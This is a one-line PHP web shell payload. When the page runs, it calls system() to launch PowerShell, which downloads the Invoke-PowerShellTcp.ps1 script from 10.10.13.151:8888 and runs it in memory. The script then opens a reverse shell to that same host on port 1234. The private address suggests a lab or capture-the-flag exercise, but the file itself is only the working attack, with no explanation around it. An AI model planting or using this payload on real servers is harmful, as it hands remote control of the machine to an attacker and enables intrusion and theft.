<?php system("powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.13.151:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.13.151 -Port 1234"); ?>
